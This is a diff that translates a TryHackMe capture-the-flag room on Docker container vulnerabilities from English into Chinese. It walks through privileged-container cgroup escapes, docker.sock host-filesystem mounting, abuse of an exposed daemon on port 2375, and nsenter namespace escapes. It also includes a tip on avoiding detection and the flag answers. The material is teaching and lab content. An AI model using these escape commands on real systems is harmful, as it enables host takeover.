@@ -2,44 +2,44 @@
 sidebar_position: 4
 ---
 
-# Container Vulnerabilities
+# 容器漏洞
 
-## Task 1 Introduction (Deploy)
+## 任务 1 简介（部署）
 
-This room will demonstrate some of the common vulnerabilities found in Docker containers and how an attacker can abuse these to escape.
+本房间将演示 Docker 容器中发现的一些常见漏洞，以及攻击者如何利用这些漏洞进行逃逸。
 
-### Learning Objectives
+### 学习目标
 
-In this room, you will learn the following:
+在本房间中，您将学习以下内容：
 
-- Some of the vulnerabilities that can exist in a Docker container.
-- What you, as an attacker, can gain from exploiting these vulnerabilities.
-- Why these vulnerabilities exist (i.e. misconfiguration).
-- How to search for vulnerabilities within a Docker container.
+- Docker 容器中可能存在的一些漏洞。
+- 作为攻击者，您可以通过利用这些漏洞获得什么。
+- 为什么这些漏洞会存在（即配置错误）。
+- 如何在 Docker 容器中搜索漏洞。
 
-### Prerequisites
+### 先决条件
 
-Before proceeding, it is strongly recommended that you have completed the Intro to Docker room and are comfortable with the Linux CLI.
+在继续之前，强烈建议您已完成 Docker 入门房间，并熟悉 Linux CLI。
 
-### Important Context
+### 重要背景
 
-This room focuses on exploiting the Docker daemon itself, which often, relies on having elevated permissions within the container. In other words, this room assumes that you have already managed to become root in the container.
+本房间重点利用 Docker 守护进程本身，这通常依赖于在容器内拥有提升的权限。 换句话说，本房间假设您已在容器中成功成为 root 用户。
 
-### Deploy the Vulnerable Machine for This Room
+### 部署本房间的易受攻击机器
 
-Press the green "Start Machine" button located at the top-right of this task. You can access the machine using the credentials below, via the TryHackMe AttackBox or by connecting your machine to the TryHackMe Network. You will be using this machine to answer the questions throughout the tasks in this room.
+按下此任务右上角的绿色“启动机器”按钮。 您可以通过 TryHackMe AttackBox 或将自己的机器连接到 TryHackMe 网络，使用以下凭据访问该机器。 您将使用此机器回答本房间各任务中的问题。
 
-|    Key   |              Value              |
-| :------: | :-----------------------------: |
-| Username |               root              |
-| Password |          tryhackme123!          |
-|    IP    | MACHINE_IP |
+|  键  |                值                |
+| :-: | :-----------------------------: |
+| 用户名 |               root              |
+|  密码 |          tryhackme123!          |
+|  IP | MACHINE_IP |
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> Complete me to progress with this room! </summary>
+<summary> 完成我以继续本房间！ </summary>
 
 ```plaintext
 No answer needed
@@ -49,21 +49,21 @@ No answer needed
 
 :::
 
-## Task 2 Container Vulnerabilities 101
+## 任务 2 容器漏洞 101
 
-Before we begin, it's important to re-cap some of the things learned in the [Intro to Containerisation](https://tryhackme.com/room/introtocontainerisation) room. First, let's recall that containers are isolated and have minimal environments. The picture below depicts the environment of a container.
+在开始之前，有必要回顾一下在[容器化入门](https://tryhackme.com/room/introtocontainerisation)房间中学到的一些内容。 首先，让我们回顾一下容器是隔离的，并且具有最小化的环境。 下图描绘了一个容器的环境。
 
-![Illustrating three containers on a single computer](img/image_20251122-192221.png)
+![说明单个计算机上的三个容器](img/image_20251122-192221.png)
 
-**Some important things to note are:**
+**需要注意的一些重要事项是：**
 
-Just because you have access (i.e. a foothold) to a container, it does not mean you have access to the host operating system and associated files or other containers.
+即使您有权访问（即立足点）容器，也不意味着您有权访问主机操作系统及相关文件或其他容器。
 
-Due to the minimal nature of containers (i.e. they only have the tools specified by the developer), you are unlikely to find fundamental tools such as Netcat, Wget or even Bash! This makes interacting within a container quite difficult for an attacker.
+由于容器的最小化特性（即它们只有开发人员指定的工具），您不太可能找到基本工具，如 Netcat、Wget 甚至 Bash！ 这使得攻击者在容器内进行交互相当困难。
 
-### What Sort of Vulnerabilities Can We Expect To Find in Docker Containers
+### 我们预期在 Docker 容器中找到哪些类型的漏洞
 
-While Docker containers are designed to isolate applications from one another, they can still be vulnerable. For example, hard-coded passwords for an application can still be present. If an attacker is able to gain access through a vulnerable web application, for example, they will be able to find these credentials. You can see an example of a web application containing hard-coded credentials to a database server in the code snippet below:
+虽然 Docker 容器旨在将应用程序彼此隔离，但它们仍然可能易受攻击。 例如，应用程序的硬编码密码可能仍然存在。 如果攻击者能够通过易受攻击的 Web 应用程序获得访问权限，例如，他们将能够找到这些凭据。 您可以在下面的代码片段中看到一个包含数据库服务器硬编码凭据的 Web 应用程序示例：
 
 ```php
 /** Database hostname */
@@ -79,21 +79,21 @@ define( 'DB_USER', 'production' );
 define( 'DB_PASSWORD', 'SuperstrongPassword321!' );
 ```
 
-This, of course, isn't the only vulnerability that can be exploited in containers. The other potential attack vectors have been listed in the table below.
+当然，这不是容器中唯一可被利用的漏洞。 其他潜在的攻击向量已在下表中列出。
 
-| Vulnerability            | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
-| :----------------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Misconfigured Containers | Misconfigured containers will have privileges that are not necessary for the operation of the container. For example, a container running in "privileged" mode will have access to the host operating system - removing the layers of isolation.                                                                                                                                                                                                                                   |
-| Vulnerable Images        | There have been numerous incidents of popular Docker images being backdoored to perform malicious actions such as crypto mining.                                                                                                                                                                                                                                                                                                                                                                   |
-| Network Connectivity     | A container that is not correctly networked can be exposed to the internet. For example, a database container for a web application should only be accessible to the web application container - not the internet.<br />Additionally, containers can serve to become a method of lateral movement. Once an attacker has access to a container, they may be able to interact with other containers on the host that are not exposed to the network. |
+| 漏洞      | 描述                                                                                                                              |
+| :------ | :------------------------------------------------------------------------------------------------------------------------------ |
+| 配置错误的容器 | 配置错误的容器将具有容器操作不需要的权限。 例如，以“特权”模式运行的容器将有权访问主机操作系统 - 移除了隔离层。                                                                      |
+| 易受攻击的镜像 | 曾多次发生流行的 Docker 镜像被植入后门以执行恶意操作（如加密货币挖矿）的事件。                                                                                     |
+| 网络连接    | 未正确联网的容器可能暴露在互联网上。 例如，Web 应用程序的数据库容器应仅对 Web 应用程序容器可访问 - 而不是互联网。<br />此外，容器可以成为横向移动的一种方法。 一旦攻击者有权访问一个容器，他们可能能够与主机上未暴露到网络的其他容器交互。 |
 
-This is just a brief summary of some of the types of vulnerabilities that can exist within a container. The tasks in this room will delve into these further!
+这只是容器中可能存在的一些漏洞类型的简要总结。 本房间的任务将深入探讨这些内容！
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> Click to proceed to the next task! </summary>
+<summary> 点击进入下一个任务！ </summary>
 
 ```plaintext
 No answer needed
@@ -103,39 +103,39 @@ No answer needed
 
 :::
 
-## Task 3 Vulnerability 1: Privileged Containers (Capabilities)
+## 任务 3 漏洞 1：特权容器（能力）
 
-### Understanding Capabilities
+### 理解能力
 
-At its fundamental, Linux capabilities are root permissions given to processes or executables within the Linux kernel. These privileges allow for the granular assignment of privileges - rather than just assigning them all.
+从根本上说，Linux 能力是授予 Linux 内核内进程或可执行文件的 root 权限。 这些特权允许细粒度地分配权限 - 而不是一次性分配所有权限。
 
-These capabilities determine what permissions a Docker container has to the operating system. Docker containers can run in two modes:
+这些能力决定了 Docker 容器对操作系统具有哪些权限。 Docker 容器可以在两种模式下运行：
 
-- User (Normal) mode
-- Privileged mode
+- 用户（普通）模式
+- 特权模式
 
-In the diagram below, we can see the two different modes in action and the level of access each mode has to the host:
+在下图中，我们可以看到两种不同模式的运行情况以及每种模式对主机的访问级别：
 
-![Illustrating the different container modes and privileges and the level of access they have to the operating system.](img/image_20251128-192822.png)
+![说明不同容器模式和特权及其对操作系统的访问级别。](img/image_20251128-192822.png)
 
-Note how containers #1 and #2 are running in "user/normal" mode, whereas container #3 is running in "privileged" mode. Containers in "user" mode interact with the operating system through the Docker Engine. Privileged containers, however, do not do this. Instead, they bypass the Docker Engine and directly communicate with the operating system.
+请注意容器 #1 和 #2 以“用户/普通”模式运行，而容器 #3 以“特权”模式运行。 “用户”模式下的容器通过 Docker 引擎与操作系统交互。 然而，特权容器不这样做。 相反，它们绕过 Docker 引擎，直接与操作系统通信。
 
-### What Does This Mean for Us
+### 这对我们意味着什么
 
-Well, if a container is running with privileged access to the operating system, we can effectively execute commands as root on the host.
+嗯，如果容器以对操作系统的特权访问运行，我们实际上可以在主机上以 root 身份执行命令。
 
-We can use a utility such as `capsh` which comes with the libcap2-bin package to list the capabilities our container has: `capsh --print` . Capabilities are used in Linux to assign specific permissions to a process. Listing the capabilities of the container is a good way to determine the syscalls that can be made and potential mechanisms for exploitation.
+我们可以使用诸如 `capsh` 这样的实用程序（随 libcap2-bin 包提供）来列出我们容器的能力：`capsh --print`。 能力在 Linux 中用于向进程分配特定权限。 列出容器的能力是确定可进行的系统调用和潜在利用机制的好方法。
 
-Some capabilities of interest have been provided in the terminal snippet below.
+下面终端片段中提供了一些值得关注的能力。
 
 ```shell title="Listing capabilities of a privileged Docker Container"
 cmnatic@privilegedcontainer:~$ capsh --print 
 Current: = cap_chown, cap_sys_module, cap_sys_chroot, cap_sys_admin, cap_setgid,cap_setuid
 ```
 
-In the example exploit below, we are going to use the mount syscall (as allowed by the container's capabilities) to mount the host's control groups into the container.
+在下面的漏洞利用示例中，我们将使用挂载系统调用（由容器的能力允许）将主机的控制组挂载到容器中。
 
-The code snippet below is based upon (but a modified) version of the [Proof of Concept (PoC) created by Trailofbits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.), which details the inner workings of this exploit well.
+下面的代码片段基于（但经过修改）[Trailofbits 创建的概念验证 (PoC)](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.)，该 PoC 详细描述了此漏洞利用的内部工作原理。
 
 ---
 
@@ -150,26 +150,26 @@ The code snippet below is based upon (but a modified) version of the [Proof of C
 8. sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
-Note: We can place whatever we like in the /exploit file (step 5). This could be, for example, a reverse shell to our attack machine.
+注意：我们可以在 /exploit 文件（步骤 5）中放置任何我们喜欢的内容。 例如，这可能是到我们攻击机器的反向 shell。
 
 ---
 
-### Explaining the Vulnerability
+### 漏洞解释
 
-1. We need to create a group to use the Linux kernel to write and execute our exploit. The kernel uses "cgroups" to manage processes on the operating system. Since we can manage "cgroups" as root on the host, we'll mount this to "/tmp/cgrp" on the container.
-2. For our exploit to execute, we'll need to tell the kernel to run our code. By adding "1" to "/tmp/cgrp/x/notify_on_release", we're telling the kernel to execute something once the "cgroup" finishes. ([Paul Menage., 2004](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt)).
-3. We find out where the container's files are stored on the host and store it as a variable.
-4. We then echo the location of the container's files into our "/exploit" and then ultimately to the "release_agent" which is what will be executed by the "cgroup" once it is released.
-5. Let's turn our exploit into a shell on the host
-6. Execute a command to echo the host flag into a file named "flag.txt" in the container once "/exploit" is executed.
-7. Make our exploit executable!
-8. We create a process and store that into "/tmp/cgrp/x/cgroup.procs". When the processs is released, the contents will be executed.
+1. 我们需要创建一个组来使用 Linux 内核编写和执行我们的漏洞利用。 内核使用 "cgroups" 来管理操作系统上的进程。 由于我们可以作为主机上的 root 管理 "cgroups"，我们将其挂载到容器的 "/tmp/cgrp"。
+2. 为了让我们的漏洞利用执行，我们需要告诉内核运行我们的代码。 通过将 "1" 添加到 "/tmp/cgrp/x/notify_on_release"，我们告诉内核在 "cgroup" 完成后执行某些内容。 ([Paul Menage., 2004](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt))。
+3. 我们找出容器文件在主机上的存储位置并将其存储为变量。
+4. 然后我们将容器文件的位置回显到我们的 "/exploit" 中，最终到 "release_agent"，这将在 "cgroup" 释放时被执行。
+5. 让我们将我们的漏洞利用转换为主机上的 shell
+6. 一旦 "/exploit" 被执行，执行命令将主机标志回显到容器中名为 "flag.txt" 的文件中。
+7. 使我们的漏洞利用可执行！
+8. 我们创建一个进程并将其存储到 "/tmp/cgrp/x/cgroup.procs" 中。 当进程被释放时，内容将被执行。
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> Perform the exploit in this task on the target machine. **What is the value of the flag that has now been added to the container?** </summary>
+<summary> 在此任务中对目标机器执行漏洞利用。 **现在已添加到容器中的标志值是什么？** </summary>
 
 ```plaintext
 THM{MOUNT_MADNESS}
@@ -179,62 +179,62 @@ THM{MOUNT_MADNESS}
 
 :::
 
-## Task 4 Vulnerability 2: Escaping via Exposed Docker Daemon
+## 任务 4 漏洞 2：通过暴露的 Docker 守护进程逃逸
 
-### Unix Sockets 101 (One Size Fits All)
+### Unix 套接字 101（通用）
 
-When mentioning "sockets", you would likely think of "sockets" in networking. Well, the concept here is almost the same. Sockets are used to move data between two places. Unix sockets use the filesystem to transfer data rather than networking interfaces. This is known as Inter-process Communication (IPC) and is essential in operating systems because being able to send data between processes is extremely important.
+当提到 "套接字" 时，您可能会想到网络中的 "套接字"。 嗯，这里的概念几乎相同。 套接字用于在两个位置之间移动数据。 Unix 套接字使用文件系统传输数据，而不是网络接口。 这被称为进程间通信（IPC），在操作系统中至关重要，因为能够在进程之间发送数据非常重要。
 
-Unix sockets are substantially quicker at transferring data than TCP/IP sockets ([Percona., 2020](https://www.percona.com/blog/2020/04/13/need-to-connect-to-a-local-mysql-server-use-unix-domain-socket/)). This is why database technologies such as [Redis](https://redis.io/) boast such outstanding performance. Unix sockets also use file system permissions. This is important to remember for the next heading.
+Unix 套接字在传输数据方面比 TCP/IP 套接字快得多 ([Percona., 2020](https://www.percona.com/blog/2020/04/13/need-to-connect-to-a-local-mysql-server-use-unix-domain-socket/))。 这就是为什么像 [Redis](https://redis.io/) 这样的数据库技术能够提供如此出色的性能。 Unix 套接字也使用文件系统权限。 这一点在下一节中要记住。
 
-### How Does Docker Use Sockets
+### Docker 如何使用套接字
 
-When interacting with the Docker Engine (i.e. running commands such as `docker run`), this will be done using a socket (usually, this is done using a Unix socket unless you execute the commands to a remote Docker host). Recall that Unix sockets use filesystem permissions. This is why you must be a member of the Docker group (or root!) to run Docker commands, as you will need the permissions to access the socket owned by Docker.
+当与 Docker 引擎交互时（即运行诸如 `docker run` 之类的命令），这将使用套接字完成（通常，这是使用 Unix 套接字完成的，除非您向远程 Docker 主机执行命令）。 回想一下，Unix 套接字使用文件系统权限。 这就是为什么您必须是 Docker 组的成员（或者是 root！） 才能运行 Docker 命令，因为您需要权限来访问 Docker 拥有的套接字。
 
 ```shell title="Verifying that our user is a part of the Docker group"
 cmnatic@demo-container:~$ groups
 cmnatic sudo docker
 ```
 
-### Finding the Docker Socket in a Container
+### 在容器中查找 Docker 套接字
 
-Remember, containers interact with the host operating system using the Docker Engine (and, therefore, have access to the Docker socket!) This socket (named docker.sock) will be mounted in the container. The location of this varies by the operating system the container is running, so you would want to `find` it. However, in this example, the container runs Ubuntu 18.04, meaning the docker.sock is located in `/var/run`.
+请记住，容器使用 Docker 引擎与主机操作系统交互（因此，可以访问 Docker 套接字！） 这个套接字（名为 docker.sock）将被挂载到容器中。 此位置因容器运行的操作系统而异，因此您需要 `find` 它。 但是，在此示例中，容器运行 Ubuntu 18.04，意味着 docker.sock 位于 `/var/run` 中。
 
-**Note**: This location can vary based on the operating system and can even be manually set by the developer at runtime of the container.
+**注意**：此位置可能因操作系统而异，甚至可以在容器运行时由开发人员手动设置。
 
 ```shell title="Finding the docker.sock file in a container"
 cmnatic@demo-container:~$ ls -la /var/run | grep sock
 srw-rw---- 1 root docker 0 Dec 9 19:37 docker.sock
 ```
 
-### Exploiting the Docker Socket in a Container
+### 利用容器中的 Docker 套接字
 
-First, let's confirm we can execute docker commands. You will either need to be root on the container or have the "docker" group permissions as a lower-privileged user.
+首先，让我们确认我们可以执行 docker 命令。 您需要在容器上是 root 用户，或者作为低权限用户拥有 "docker" 组权限。
 
-Let's break down the vulnerability here:
-
----
-
-We will use Docker to create a new container and mount the host's filesystem into this new container. Then we are going to access the new container and look at the host's filesystem.
-
-Our final command will look like this: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`, which does the following:
-
-1. We will need to upload a docker image. For this room, I have provided this on the VM. It is called "alpine". The "alpine" distribution is not a necessity, but it is extremely lightweight and will blend in a lot better. To avoid detection, it is best to use an image that is already present in the system, otherwise, you will have to upload this yourself.
-2. We will use `docker run` to start the new container and mount the host's file system (/) to (/mnt) in the new container: `docker run -v /:/mnt`
-3. We will tell the container to run interactively (so that we can execute commands in the new container): `-it`
-4. Now, we will use the already provided alpine image: `alpine`
-5. We will use `chroot` to change the root directory of the container to be /mnt (where we are mounting the files from the host operating system): `chroot /mnt`
-6. Now, we will tell the container to run `sh` to gain a shell and execute commands in the container: `sh`
-
-You may need to "Ctrl + C" to cancel the exploit once or twice for this vulnerability to work, but, as you can see below, we have successfully mounted the host operating system's filesystem into the new alpine container.
+让我们分解这里的漏洞：
 
 ---
 
-### Verify Success
+我们将使用 Docker 创建一个新容器，并将主机的文件系统挂载到这个新容器中。 然后我们将访问新容器并查看主机的文件系统。
 
-After executing the command, we should see that we have been placed into a new container. Remember, we mounted the host's filesystem to /mnt (and then used `chroot` to make the container's /mnt become /)
+我们的最终命令将如下所示：`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`，它执行以下操作：
 
-So, let's see the contents of /  by doing `ls /`
+1. 我们将需要上传一个 docker 镜像。 对于这个房间，我已经在 VM 上提供了这个。 它被称为 "alpine"。 "alpine" 发行版不是必需的，但它非常轻量级，并且会更好地融入环境。 为了避免检测，最好使用系统中已存在的镜像，否则，您必须自己上传。
+2. 我们将使用 `docker run` 启动新容器并将主机的文件系统 (/) 挂载到新容器中的 (/mnt)：`docker run -v /:/mnt`
+3. 我们将告诉容器以交互方式运行（以便我们可以在新容器中执行命令）：`-it`
+4. 现在，我们将使用已提供的 alpine 镜像：`alpine`
+5. 我们将使用 `chroot` 将容器的根目录更改为 /mnt（我们在这里挂载来自主机操作系统的文件）：`chroot /mnt`
+6. 现在，我们将告诉容器运行 `sh` 以获得 shell 并在容器中执行命令：`sh`
+
+您可能需要 "Ctrl + C" 一次或两次来取消漏洞利用，但如下所示，我们已成功将主机操作系统的文件系统挂载到新的 alpine 容器中。
+
+---
+
+### 验证成功
+
+执行命令后，我们应该看到我们已被放置到一个新容器中。 请记住，我们将主机的文件系统挂载到 /mnt（然后使用 `chroot` 使容器的 /mnt 变为 /）
+
+所以，让我们通过 `ls /` 查看 / 的内容
 
 ```shell title="Listing the contents of / on the new container (which will have the host operating system's files)"
 root@alpine-container:~# ls /
@@ -242,11 +242,11 @@ bin   dev  home  lib32  libx32      media  opt   root  sbin  srv       sys  usr
 boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  swapfile  tmp  var
 ```
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> Name the directory path which contains the docker.sock file on the container. </summary>
+<summary> 命名容器上包含 docker.sock 文件的目录路径。 </summary>
 
 ```plaintext
 /var/run
@@ -256,7 +256,7 @@ boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  swapfile  tmp  var
 
 <details>
 
-<summary> Perform the exploit in this task on the target machine. **What is the value of the flag located at /root/flag.txt on the host operating system?** </summary>
+<summary> 在此任务中对目标机器执行漏洞利用。 **主机操作系统上 /root/flag.txt 处的标志值是什么？** </summary>
 
 ```plaintext
 THM{NEVER-ENOUGH-SOCKS}
@@ -266,21 +266,21 @@ THM{NEVER-ENOUGH-SOCKS}
 
 :::
 
-## Task 5 Vulnerability 3: Remote Code Execution via Exposed Docker Daemon
+## 任务 5 漏洞 3：通过暴露的 Docker 守护进程进行远程代码执行
 
-### The Docker Engine - TCP Sockets Edition
+### Docker 引擎 - TCP 套接字版
 
-Recall how Docker uses sockets to communicate between the host operating system and containers in the previous task. Docker can also use TCP sockets to achieve this.
+回想一下 Docker 在先前任务中如何使用套接字在主机操作系统和容器之间通信。 Docker 也可以使用 TCP 套接字来实现这一点。
 
-Docker can be remotely administrated. For example, using management tools such as [Portainer](https://www.portainer.io/) or [Jenkins](https://www.jenkins.io/) to deploy containers to test their code (yay, automation!).
+Docker 可以远程管理。 例如，使用管理工具如 [Portainer](https://www.portainer.io/) 或 [Jenkins](https://www.jenkins.io/) 来部署容器以测试其代码（耶，自动化！）。
 
-### The Vulnerability
+### 漏洞
 
-The Docker Engine will listen on a port when configured to be run remotely. The Docker Engine is easy to make remotely accessible but difficult to do securely. The vulnerability here is Docker is remotely accessible and allows anyone to execute commands. First, we will need to enumerate.
+当配置为远程运行时，Docker 引擎将监听一个端口。 Docker 引擎易于远程访问，但难以安全地实现。 这里的漏洞是 Docker 可远程访问并允许任何人执行命令。 首先，我们需要枚举。
 
-### Enumerating: Finding Out if a Device Has Docker Remotely Accessible
+### 枚举：查找设备是否具有可远程访问的 Docker
 
-By default, the engine will run on **port 2375**. We can confirm this by performing an Nmap scan against your target (10.80.133.1) from your AttackBox.
+默认情况下，引擎将在 **端口 2375** 上运行。 我们可以通过从您的 AttackBox 对目标 (10.80.133.1) 执行 Nmap 扫描来确认这一点。
 
 ```shell title="Verifying if our target has Docker remotely accessible"
 cmnatic@attack-machine:~$ nmap -sV -p 2375 10.80.133.1 Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-02 21:27 GMT
@@ -291,7 +291,7 @@ PORT    STATE SERVICE VERSION
 2375/tcp open docker Docker 20.10.20 (API 1.41)
 ```
 
-Looks like it's open; we're going to use the `curl` command to start interacting with the exposed Docker daemon. Confirming that we can access the Docker daemon: curl `http://MACHINE_IP:2375/version`
+看起来它是开放的；我们将使用 `curl` 命令开始与暴露的 Docker 守护进程交互。 确认我们可以访问 Docker 守护进程：curl `http://MACHINE_IP:2375/version`
 
 ```shell title="CURLing the Docker Socket"
 cmnatic@attack-machine:~$ curl http://10.80.133.1:2375/version
@@ -317,9 +317,9 @@ cmnatic@attack-machine:~$ curl http://10.80.133.1:2375/version
 }
 ```
 
-### Executing Docker Commands on Our Target
+### 在我们的目标上执行 Docker 命令
 
-For this, we'll need to tell our version of Docker to send the command to our target (not our own machine). We can add the "-H" switch to our target. To test if we can run commands, we'll list the containers on the target: `docker -H tcp://10.80.133.1:2375 ps`
+为此，我们需要告诉我们的 Docker 版本将命令发送到我们的目标（而不是我们自己的机器）。 我们可以添加 "-H" 开关到我们的目标。 要测试我们是否可以运行命令，我们将列出目标上的容器：`docker -H tcp://10.80.133.1:2375 ps`
 
 ```shell title="Listing the containers on our target"
 cmnatic@attack-machine:~$ docker -H tcp://10.80.133.1:2375 ps
@@ -327,21 +327,21 @@ CONTAINER ID   IMAGE        COMMAND               CREATED        STATUS         
 b4ec8c45414c   dockertest   "/usr/sbin/sshd -D"   10 hours ago   Up 7 minutes   0.0.0.0:22->22/tcp, :::22->22/tcp   priceless_mirzakhani
 ```
 
-### What Now
+### 现在怎么办
 
-Now that we've confirmed that we can execute docker commands on our target, we can do all sorts of things. For example, start containers, stop containers, delete them, or export the contents of the containers for us to analyse further. It is worth recalling the commands covered in [Intro to Docker](https://tryhackme.com/room/introtodockerk8pdqk). However, I've included some commands that you may wish to explore:
+既然我们已经确认可以在目标上执行 docker 命令，我们就可以做各种各样的事情。 例如，启动容器、停止容器、删除它们，或者导出容器的内容供我们进一步分析。 值得回顾一下 [Intro to Docker](https://tryhackme.com/room/introtodockerk8pdqk) 中涵盖的命令。 但是，我包含了一些您可能希望探索的命令：
 
-| Command | Description                                                                                                    |
-| :------ | :------------------------------------------------------------------------------------------------------------- |
-| images  | List images used by containers; data can also be exfiltrated by reverse-engineering the image. |
-| exec    | Execute a command on a container.                                                              |
-| run     | Run a container.                                                                               |
+| 命令     | 描述                          |
+| :----- | :-------------------------- |
+| images | 列出容器使用的镜像；数据也可以通过逆向工程镜像来外泄。 |
+| exec   | 在容器上执行命令。                   |
+| run    | 运行一个容器。                     |
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> What port number, by default, does the Docker Engine use? </summary>
+<summary> Docker 引擎默认使用哪个端口号？ </summary>
 
 ```plaintext
 2375
@@ -351,17 +351,17 @@ Now that we've confirmed that we can execute docker commands on our target, we c
 
 :::
 
-## Task 6 Vulnerability 4: Abusing Namespaces
+## 任务 6 漏洞 4：滥用命名空间
 
-### What Are Namespaces
+### 什么是命名空间
 
-Namespaces segregate system resources such as processes, files, and memory away from other namespaces. Every process running on Linux will be assigned two things:
+命名空间将系统资源（如进程、文件和内存）与其他命名空间隔离开来。 在 Linux 上运行的每个进程都将被分配两样东西：
 
-- A namespace
-- A Process Identifier (PID)
+- 一个命名空间
+- 一个进程标识符 (PID)
 
-Namespaces are how containerisation is achieved! Processes can only "see" the process in the same namespace. Take Docker, for example, every new container will run as a new namespace, although the container may run multiple applications (processes).
-Let's prove the concept of containerisation by comparing the number of processes on the host operating system, in comparison to the Docker container that the host is running (an apache2 web server):
+命名空间是实现容器化的方式！ 进程只能"看到"同一命名空间中的进程。 以 Docker 为例，每个新容器都将作为一个新的命名空间运行，尽管容器可能运行多个应用程序（进程）。
+让我们通过比较主机操作系统上的进程数量与主机正在运行的 Docker 容器（一个 apache2 Web 服务器）来证明容器化的概念：
 
 ```shell title="Listing running processes on a "normal" Ubuntu system"
 cmnatic@thm-dev:~$ ps aux
@@ -383,15 +383,15 @@ cmnatic     3563  0.0  0.1  12908  6784 pts/0    Ss+  00:49   0:00 bash
 --cut for brevity--
 ```
 
-In the first column on the very left, we can see the user the process is running as including the process number (PID). Additionally, notice that the column on the very right has the command or application that started the process (such as Firefox and Gnome terminal). It's important to note here that multiple applications and processes are running (specifically 320!).
+在最左边的第一列中，我们可以看到进程运行的用户，包括进程号 (PID)。 此外，请注意最右边的列包含启动进程的命令或应用程序（例如 Firefox 和 Gnome 终端）。 这里需要注意的是，有多个应用程序和进程正在运行（具体来说是 320 个！）。
 
-Generally speaking, a Docker container will have very processes running. This is because a container is designed to do one task. I.e., just run a web server, or a database.
+一般来说，Docker 容器运行的进程非常少。 这是因为容器被设计为执行一项任务。 也就是说，只运行一个 Web 服务器或一个数据库。
 
-### Determining if We're in a Container (Processes)
+### 确定我们是否在容器中（进程）
 
-Let's list the processes running in our Docker container using `ps aux`. It's important to note that we only have six processes running in this example. The difference in the number of processes is usually a great indicator that we're in a container.
+让我们使用 `ps aux` 列出 Docker 容器中运行的进程。 需要注意的是，在这个例子中我们只有六个进程在运行。 进程数量的差异通常是一个很好的指标，表明我们在容器中。
 
-Additionally, the first process in the snippet below has a PID of 1. This is the first process that is running. PID 1 (usually init) is the ancestor (parent) for all future processes that are started. If, for whatever reason, this process is stopped, then all other processes are stopped too.
+此外，下面代码片段中的第一个进程的 PID 为 1。 这是正在运行的第一个进程。 PID 1（通常是 init）是所有未来启动进程的祖先（父进程）。 如果由于某种原因这个进程停止，那么所有其他进程也会停止。
 
 ```shell title="Listing running processes on a container"
 root@demo-container:~# ps aux
@@ -403,13 +403,13 @@ www-data      16  0.1 0.1 1211168 4116 ?  S 00:47 0:00 /usr/sbin/apache2 -D FORE
 root          81  0.0 0.0 5888 2972 pts/0  R+ 00:52 ps aux
 ```
 
-Comparatively, we can see that only 5 processes are running. A good indicator that we're in a container! However, as we come to discover shortly, this is not 100% indicative. There are cases where, ironically, you want the container to be able to interact directly with the host.
+相比之下，我们可以看到只有 5 个进程在运行。 一个很好的指标，表明我们在容器中！ 然而，我们很快就会发现，这并非 100% 确定。 在某些情况下，讽刺的是，您希望容器能够直接与主机交互。
 
-### How Can We Abuse Namespaces
+### 我们如何滥用命名空间
 
-Recall cgroups (control groups) in a previous vulnerability. We are going to be using these in another method of exploitation. This attack abuses conditions where the container will share the same namespace as the host operating system (and therefore, the container can communicate with the processes on the host).
+回顾之前漏洞中的 cgroups（控制组）。 我们将在另一种利用方法中使用这些。 这种攻击滥用了容器与主机操作系统共享相同命名空间的情况（因此，容器可以与主机上的进程通信）。
 
-You might see this in cases where the container relies on a process running or needs to "plug in" to the host such as the use of debugging tools. In these situations, you can expect to see the host's processes in the container when listing them via `ps aux`.
+您可能会在容器依赖正在运行的进程或需要"插入"主机的情况下看到这种情况，例如使用调试工具时。 在这些情况下，当通过 `ps aux` 列出进程时，您可以在容器中看到主机的进程。
 
 ```shell title="Edge case: Determining if a container can interact with the host's processes"
 root@demo-container:~# ps aux
@@ -424,29 +424,29 @@ root        2141  0.0  0.4 712144  9192 ?        Sl   12:00   0:00 /usr/bin/cont
 root        2163  0.0  0.2  72308  5644 ?        Ss   12:00   0:00 /usr/sbin/sshd -D
 ```
 
-### The Exploit
+### 利用
 
-For this vulnerability, we will be using nsenter (namespace enter). This command allows us to execute or start processes, and place them within the same namespace as another process. In this case, we will be abusing the fact that the container can see the "/sbin/init" process on the host, meaning that we can launch new commands such as a bash shell on the host.
+对于此漏洞，我们将使用 nsenter（命名空间进入）。 此命令允许我们执行或启动进程，并将它们放置在另一个进程的同一命名空间中。 在这种情况下，我们将滥用容器可以看到主机上的 "/sbin/init" 进程这一事实，这意味着我们可以在主机上启动新命令，例如 bash shell。
 
 ---
 
-Use the following exploit: `nsenter --target 1 --mount --uts --ipc --net /bin/bash`, which does the following:
+使用以下利用：`nsenter --target 1 --mount --uts --ipc --net /bin/bash`，其作用如下：
 
-1. We use the `--target` switch with the value of "1" to execute our shell command that we later provide to execute in the namespace of the special system process ID to get the ultimate root!
+1. 我们使用值为 "1" 的 `--target` 开关来执行我们稍后提供的 shell 命令，在特殊系统进程 ID 的命名空间中执行以获得终极 root 权限！
 
-2. Specifying `--mount` this is where we provide the mount namespace of the process that we are targeting. "If no file is specified, enter the mount namespace of the target process." ([Man.org., 2013](https://man7.org/linux/man-pages/man1/nsenter.1.html)).
